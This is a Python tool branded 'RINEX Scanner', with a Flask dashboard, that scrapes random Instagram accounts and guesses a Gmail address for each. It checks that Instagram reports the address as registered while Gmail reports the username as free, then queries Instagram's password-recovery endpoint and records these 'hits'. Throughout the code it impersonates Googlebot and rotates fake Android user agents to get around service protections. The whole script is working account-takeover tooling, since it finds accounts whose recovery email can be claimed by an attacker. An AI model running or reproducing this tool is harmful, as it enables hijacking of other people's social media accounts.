import os, requests, re, sys, time as t, json, uuid, hashlib, random, string, threading, base64, sqlite3
from requests import get, post as pp
from user_agent import generate_user_agent as _ua
from random import choice as _ch, randrange as _rr
import httpx
from flask import Flask, render_template_string, send_file, jsonify, request, send_from_directory
from datetime import datetime
import html
from queue import Queue
import gc

app_web = Flask(__name__)

RESET = '\033[0m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
C1 = "\033[1;97;40m"

_CHARS = 'azertyuiopmlkjhgfdsqwxcvbn'

# Basit HTML Template - Hızlı yüklensin
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>RINEX Scanner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace;
            padding: 10px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 15px;
        }
        .header { text-align: center; border-bottom: 1px solid #00ff00; padding-bottom: 15px; margin-bottom: 15px; }
        .header h1 { color: #ffd700; font-size: 2em; }
        .header p { color: #ff6b6b; font-size: 0.9em; }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin: 15px 0;
        }
        .stat-card {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 10px;
            text-align: center;
        }
        .stat-card .number { font-size: 1.8em; color: #00ff00; font-weight: bold; }
        .stat-card .label { color: #888; font-size: 0.8em; }
        .controls {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        .btn {
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            padding: 8px 20px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 0.9em;
        }
        .btn:hover { background: #00cc00; transform: scale(1.02); }
        .btn-download { background: #ffd700; }
        .btn-download:hover { background: #ffcc00; }
        .btn-hide { background: #ff4444; }
        .btn-hide:hover { background: #cc0000; }
        .hits-container {
            margin: 15px 0;
            max-height: 500px;
            overflow-y: auto;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 10px;
        }
        .hits-container::-webkit-scrollbar { width: 6px; }
        .hits-container::-webkit-scrollbar-track { background: #1a1a1a; }
        .hits-container::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 3px; }
        .hit-item {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 3px;
            padding: 8px;
            margin: 3px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.9em;
        }
        .hit-item:hover { border-color: #00ff00; background: #1f1f1f; }
        .hit-item .username { color: #00ff00; font-weight: bold; }
        .hit-item .year { color: #ffd700; }
        .hit-item .email { color: #4fc3f7; }
        .hidden { display: none; }
        #toggleBtn { margin: 10px 0; }
        @media (max-width: 600px) {
            .stats { grid-template-columns: repeat(2, 1fr); }
            .hit-item { flex-direction: column; align-items: flex-start; gap: 3px; font-size: 0.8em; }
            .header h1 { font-size: 1.5em; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ RINEX SCANNER</h1>
            <p>BY @rinexdestek | @rinexsorgux</p>
        </div>

        <div class="stats">
            <div class="stat-card"><div class="number" id="hits">0</div><div class="label">🎯 Hits</div></div>
            <div class="stat-card"><div class="number" id="checked">0</div><div class="label">🔍 Checked</div></div>
            <div class="stat-card"><div class="number" id="bad">0</div><div class="label">❌ Bad</div></div>
            <div class="stat-card"><div class="number" id="total">0</div><div class="label">📊 Total</div></div>
        </div>

        <div class="controls">
            <a href="/download/txt" class="btn btn-download">📥 Download TXT</a>
            <a href="/download/all" class="btn">📊 HTML</a>
            <button onclick="toggleHits()" class="btn btn-hide" id="toggleBtn">🙈 Hide Hits</button>
            <button onclick="refreshData()" class="btn">🔄 Refresh</button>
        </div>

        <div id="hitsContainer">
            <h3>📋 Recent Hits</h3>
            <div class="hits-container" id="hitsFeed">
                {% for hit in recent_hits %}
                <div class="hit-item">
                    <div><span class="username">@{{ hit.username }}</span> <span class="email">{{ hit.email }}</span></div>
                    <div><span class="year">📅 {{ hit.year }}</span> 👥 {{ hit.followers }} <a href="https://instagram.com/{{ hit.username }}" target="_blank" style="color:#00ff00;">🔗</a></div>
                </div>
                {% endfor %}
            </div>
        </div>
    </div>

    <script>
        let hitsVisible = true;
        function toggleHits() {
            const container = document.getElementById('hitsContainer');
            const btn = document.getElementById('toggleBtn');
            if (hitsVisible) {
                container.classList.add('hidden');
                btn.textContent = '👁️ Show Hits';
                btn.className = 'btn';
            } else {
                container.classList.remove('hidden');
                btn.textContent = '🙈 Hide Hits';
                btn.className = 'btn btn-hide';
            }
            hitsVisible = !hitsVisible;
        }

        function refreshData() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('hits').textContent = data.hits;
                    document.getElementById('checked').textContent = data.checked;
                    document.getElementById('bad').textContent = data.bad;
                    document.getElementById('total').textContent = data.total;
                });
        }
        setInterval(refreshData, 5000);
    </script>
</body>
</html>
"""

class _Core:
    def __init__(self):
        self._H = 0
        self._C = 0
        self._BI = 0
        self._BE = 0
        self._yr_range = None
        self._yr_val = None
        self._found = set()
        self._cache = {}
        self._token = os.environ.get('TELEGRAM_TOKEN', '')
        self._cid = os.environ.get('TELEGRAM_CHAT_ID', '')
        self._tls_file = "_dabb_tls.dat"
        self._hits_file = "_dabb_hits.log"
        self._db_file = "hits.db"
        self._queue = Queue(maxsize=1000)
        self._running = True
        self._init_db()
        self._hit_count = 0
        
        # Worker thread'ler
        self._workers = []
        for i in range(10):
            w = threading.Thread(target=self._worker, daemon=True)
            w.start()
            self._workers.append(w)
    
    def _init_db(self):
        conn = sqlite3.connect(self._db_file)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS hits
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      username TEXT,
                      email TEXT,
                      year TEXT,
                      followers INTEGER,
                      posts INTEGER,
                      reset_link TEXT,
                      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        conn.commit()
        conn.close()
    
    def _save_hit_to_db(self, username, email, year, followers, posts, reset_link):
        try:
            conn = sqlite3.connect(self._db_file)
            c = conn.cursor()
            c.execute('''INSERT INTO hits (username, email, year, followers, posts, reset_link)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (username, email, year, followers, posts, reset_link))
            conn.commit()
            conn.close()
            self._hit_count += 1
            return True
        except:
            return False
    
    def _get_recent_hits(self, limit=100):
        try:
            conn = sqlite3.connect(self._db_file)
            c = conn.cursor()
            c.execute('''SELECT username, email, year, followers, posts, reset_link 
                         FROM hits ORDER BY timestamp DESC LIMIT ?''', (limit,))
            rows = c.fetchall()
            conn.close()
            return rows
        except:
            return []
    
    def _get_all_hits(self):
        try:
            conn = sqlite3.connect(self._db_file)
            c = conn.cursor()
            c.execute('SELECT username, email, year, followers, posts, reset_link FROM hits ORDER BY timestamp DESC')
            rows = c.fetchall()
            conn.close()
            return rows
        except:
            return []
    
    def _get_stats(self):
        return {
            'hits': self._H,
            'checked': self._C,
            'bad': self._BE + self._BI,
            'total': self._H + self._BE + self._BI
        }
    
    def _clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def _banner(self):
        self._clear()
        print(f"""{YELLOW}
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █                                      
   █    {YELLOW}★BY RİNEX ★ {RESET}
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
""")
        print(f'''{YELLOW}
╔═════════════════════════════════
║{GREEN}BY RİNEX @rinexdestek {YELLOW} 
║{RED}RİNEX 2026 İNSTA TOOL {RED}
║  {YELLOW} ★BY RİNEX {GREEN}                       
╚════════════════════════════════
''')
    
    def _fetch_tokens(self):
        try:
            googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
            a1 = ''.join(_ch(_CHARS) for _ in range(_rr(6,9)))
            a2 = ''.join(_ch(_CHARS) for _ in range(_rr(3,9)))
            b1 = ''.join(_ch(_CHARS) for _ in range(_rr(15,30)))
            he = {
                "accept":"*/*",
                "content-type":"application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf":"1",
                "sec-ch-ua-mobile":"?1",
                "sec-ch-ua-platform":'"Android"',
                'user-agent':googlebot_ua,
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            }
            r1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he, timeout=10)
            c1 = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', r1.text).group(2)
            cks = {'__Host-GAPS':b1}
            hd = {
                'authority':'accounts.google.com',
                'accept':'*/*',
                'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf':'1',
                'origin':'https://accounts.google.com',
                'user-agent':googlebot_ua,
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
            data = {
                'f.req':'["'+c1+'","'+a1+'","'+a2+'","'+a1+'","'+a2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            session = requests.Session()
            session.headers.update(hd)
            session.cookies.update(cks)
            resp = session.post('https://accounts.google.com/_/signup/validatepersonaldetails', data=data, timeout=10)
            tl = str(resp.text).split('",null,"')[1].split('"')[0]
            b1 = resp.cookies.get_dict()['__Host-GAPS']
            try:
                os.remove(self._tls_file)
            except:
                pass
            with open(self._tls_file,'a') as f:
                f.write(tl+'//'+b1+'\n')
            return True
        except:
            return False
    
    def _droid_ua(self):
        devs = [
            ("samsung","SM-G973F","beyond1","exynos9820"),
            ("samsung","SM-A536B","a53x","s5e8825"),
            ("samsung","SM-S918B","dm1q","kalama"),
            ("Google","Pixel 6","raven","gs101"),
            ("Google","Pixel 7","panther","gs201"),
            ("Xiaomi","M2102J20SG","ares","mt6893"),
            ("OnePlus","ONEPLUS A6003","OnePlus6","sdm845"),
            ("OPPO","CPH2371","OP4F1F","mt6893"),
        ]
        d = random.choice(devs)
        v = random.choice(["11","12","13","14"])
        api = {"11":"30","12":"31","13":"33","14":"34"}[v]
        dpi = random.choice(["420","480"])
        h = random.choice(["2280","2340","2400"])
        ig = f"{random.randint(300,350)}.0.0.{random.randint(10,40)}.{random.randint(80,150)}"
        return f"Instagram {ig} Android ({api}/{v}; {dpi}dpi; 1080x{h}; {d[0]}; {d[1]}; {d[2]}; {d[3]}; en_US; {random.randint(300000000,400000000)})"
    
    def _val_ig(self, e):
        try:
            ua = self._droid_ua()
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }
            session = httpx.Client(timeout=10, follow_redirects=True)
            session.headers.update(headers)
            r = session.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={e}",
            )
            if 'email_is_taken' in r.text:
                return True
            return False
        except:
            return False
    
    def _get_reset(self, u):
        try:
            ua = self._droid_ua()
            ig_did = str(uuid.uuid4()).upper()
            mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
            h = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Connection": "keep-alive",
                "x-ig-app-id": "567067343352427",
                "x-ig-device-id": ig_did,
                "x-ig-connection-type": "WIFI",
                "x-ig-capabilities": "3brTvw==",
                "x-csrftoken": "missing",
                "x-fb-http-engine": "Liger",
                "Origin": "https://www.instagram.com",
                "Referer": "https://instagram.com/accounts/password/reset/",
                "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
                "sec-ch-ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
            }
            session = httpx.Client(timeout=15, follow_redirects=True)
            session.headers.update(h)
            r = session.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username":u},
            ).text
            data = json.loads(r)
            if "contact_point" in data:
                return data["contact_point"]
            return 'N/A'
        except:
            return 'N/A'
    
    def _smart_match(self, u, ri):
        if not ri or ri == 'N/A':
            return True
        try:
            if '@' in ri:
                rp = ri.split('@')[0]
            else:
                rp = ri
            cl = rp.replace('*','').replace('•','').replace('…','').replace('.','')
            if len(cl) < 1 or len(u) < 1:
                return True
            return cl[0].lower() == u[0].lower()
        except:
            return True
    
    def _yr_from_id(self, uid):
        try:
            x = int(uid)
            if x < 18957417: return 2010
            elif x < 210468786: return 2011
            elif x < 390438486: return 2012
            elif x < 1479010000: return 2013
            elif x < 1700000000: return 2014
            elif x < 3313668786: return 2015
            elif x < 5398785217: return 2016
            elif x < 7497939245: return 2017
            elif x < 11254029834: return 2018
            elif x < 21254029834: return 2019
            elif x < 50289297647: return 2020
            elif x < 57464707082: return 2021
            elif x < 63313426938: return 2022
            elif x < 900000000000: return 2023
            else: return 2024
        except:
            return 'N/A'
    
    def _send_hit(self, u, d, re, ry, f, p):
        self._H += 1
        email = f"{u}@{d}"
        
        # Direkt DB'ye kaydet
        self._save_hit_to_db(u, email, str(ry), f, p, re)
        
        # TXT'ye de kaydet
        try:
            with open(self._hits_file,'a',encoding='utf-8') as fh:
                fh.write(f"@{u} | {email} | {ry} | {re}\n")
        except: pass
        
        print(f"{GREEN}[HIT]{RESET} @{u} | Year: {ry} | Followers: {f}")
    
    def _val_gml(self, e):
        if '@' in e: e = str(e).split('@')[0]
        for _ in range(2):
            try:
                try:
                    _x = open(self._tls_file,'r').read().splitlines()[0]
                except:
                    self._fetch_tokens()
                    _x = open(self._tls_file,'r').read().splitlines()[0]
                _tl, _h = _x.split('//')
                c = {'__Host-GAPS':_h}
                googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                h = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'google-accounts-xsrf': '1',
                    'origin': 'https://accounts.google.com',
                    'user-agent': googlebot_ua,
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                }
                p = {'TL':_tl}
                d = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+_tl+'%22%2C%22'+e+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&flowName=GlifWebSignIn&'
                session = requests.Session()
                session.headers.update(h)
                session.cookies.update(c)
                r = session.post('https://accounts.google.com/_/signup/usernameavailability', params=p, data=d, timeout=8)
                if '"gf.uar",1' in str(r.text):
                    return True
                elif '"er",null,null,null,null,400' in str(r.text):
                    self._fetch_tokens()
                    continue
                else:
                    return False
            except:
                self._fetch_tokens()
        return False
    
    def _worker(self):
        """Worker thread - queue'dan iş alır"""
        while self._running:
            try:
                item = self._queue.get(timeout=1)
                if item is None:
                    continue
                e, ud = item
                self._C += 1
                try:
                    if self._val_ig(e):
                        gml = self._val_gml(e)
                        if gml:
                            u, d = e.split('@')
                            re = self._get_reset(u)
                            if self._smart_match(u, re):
                                f = ud.get('follower_count',0) if ud else 0
                                p = ud.get('media_count',0) if ud else 0
                                ry = 'N/A'
                                if ud:
                                    uid = str(ud.get('id', ud.get('pk','')))
                                    ry = self._yr_from_id(uid)
                                self._send_hit(u, d, re, ry, f, p)
                            else:
                                self._BE += 1
                        else:
                            self._BE += 1
                    else:
                        self._BI += 1
                except:
                    self._BI += 1
                self._queue.task_done()
            except:
                continue
    
    def _scan_loop(self):
        """Scanner - sürekli user ID'leri çeker"""
        while self._running:
            try:
                ua_list = [
                    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
                    "Instagram 311.0.0.32.118 Android (23/6.0; 420dpi; 1080x2280; SAMSUNG; SM-G973F)"
                ]
                ua = random.choice(ua_list)
                
                if self._yr_range:
                    st, en = self._yr_range
                    Id = str(_rr(st, en))
                else:
                    Id = str(_rr(2500000000, 8597939245))
                
                lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'user-agent': ua,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd,
                    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                }
                d = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': '{"userID":"'+Id+'","username":"cristiano"}',
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001',
                }
                
                session = requests.Session()
                session.headers.update(headers)
                r = session.post('https://www.instagram.com/api/graphql', data=d, timeout=8)
                
                try:
                    j = r.json()
                except:
                    continue
                
                ud = j.get('data',{}).get('user',{})
                if not ud:
                    continue
                
                u = ud.get('username','')
                if not u or u in self._found:
                    continue
                if '_' in u or len(u) < 8:
                    continue
                
                self._found.add(u)
                email = u + '@gmail.com'
                
                # Queue'ya ekle
                if self._queue.qsize() < 900:
                    self._queue.put((email, ud))
                
            except:
                continue
    
    def _stats_loop(self):
        while self._running:
            self._clear()
            self._banner()
            yr = f"{CYAN}{self._yr_val}" if self._yr_val else "ALL"
            qsize = self._queue.qsize()
            tt = f"""
 ╔══════════════════════════════════════════════╗
 ║  {YELLOW} BY RİNEX LIVE STATS ⚡{C1}              ║
 ╠══════════════════════════════════════════════╣
 ║  🎯 Hits         : {RED}{self._H}{C1}
 ║  🔍 Checked      : {YELLOW}{self._C}{C1}
 ║  ❌ Bad Email    : {RED}{self._BE}{C1}
 ║  🚫 Bad IG      : {YELLOW}{self._BI}{C1}
 ║  📦 Queue        : {CYAN}{qsize}{C1}
 ║  📅 Year        : {yr}{C1}
 ╠══════════════════════════════════════════════╣
 ║  👨 @rinexdestek | ⛓️ @rinexsorgux           ║
 ╚══════════════════════════════════════════════╝
"""
            print(tt)
            t.sleep(2)
    
    def run(self):
        self._banner()
        print(f"{GREEN}[+] Başlatılıyor...{RESET}")
        self._fetch_tokens()
        
        self._yr_range = None
        self._yr_val = None
        
        print(f"{GREEN}[+] Tüm yıllar taranıyor...{RESET}")
        
        # Web sunucusu
        threading.Thread(target=self._start_web_server, daemon=True).start()
        
        # Stats
        threading.Thread(target=self._stats_loop, daemon=True).start()
        
        # Scanner thread'ler (50 tane)
        for _ in range(50):
            threading.Thread(target=self._scan_loop, daemon=True).start()
        
        print(f"{GREEN}[+] Web: http://0.0.0.0:{os.environ.get('PORT', 5000)}{RESET}")
        print(f"{GREEN}[+] Hit göster butonuna basabilirsin{RESET}")
        
        while True:
            t.sleep(10)
    
    def _start_web_server(self):
        port = int(os.environ.get('PORT', 5000))
        app_web.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Flask routes
@app_web.route('/')
def index():
    hits = app._get_recent_hits(100)
    recent_hits = []
    for hit in hits:
        recent_hits.append({
            'username': hit[0],
            'email': hit[1],
            'year': hit[2],
            'followers': hit[3],
            'posts': hit[4],
            'reset_link': hit[5]
        })
    return render_template_string(HTML_TEMPLATE, recent_hits=recent_hits)

@app_web.route('/api/stats')
def api_stats():
    return jsonify(app._get_stats())

@app_web.route('/api/hits')
def api_hits():
    hits = app._get_recent_hits(200)
    hits_list = []
    for hit in hits:
        hits_list.append({
            'username': hit[0],
            'email': hit[1],
            'year': hit[2],
            'followers': hit[3],
            'posts': hit[4]
        })
    return jsonify({'hits': hits_list, 'total': len(hits_list)})

@app_web.route('/download/txt')
def download_txt():
    hits = app._get_all_hits()
    content = "RINEX HITS\n" + "="*40 + "\n"
    content += f"Total: {len(hits)}\n\n"
    for hit in hits:
        content += f"@{hit[0]} | {hit[1]} | {hit[2]} | {hit[3]}\n"
    
    filename = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    return send_file(filename, as_attachment=True)

@app_web.route('/download/all')
def download_all():
    hits = app._get_all_hits()
    html = """<!DOCTYPE html><html><head><title>Hits</title>
    <style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}
    table{width:100%;border-collapse:collapse}
    th,td{border:1px solid #333;padding:8px;text-align:left}
    th{background:#1a1a1a;color:#ffd700}
    </style></head><body><h1>HITS</h1><table><tr><th>#</th><th>User</th><th>Email</th><th>Year</th><th>Followers</th></tr>"""
    for i, h in enumerate(hits, 1):
        html += f"<tr><td>{i}</td><td>@{h[0]}</td><td>{h[1]}</td><td>{h[2]}</td><td>{h[3]}</td></tr>"
    html += "</table></body></html>"
    return html

app = _Core()

if __name__ == '__main__':
    try:
        app.run()
    except KeyboardInterrupt:
        sys.exit()
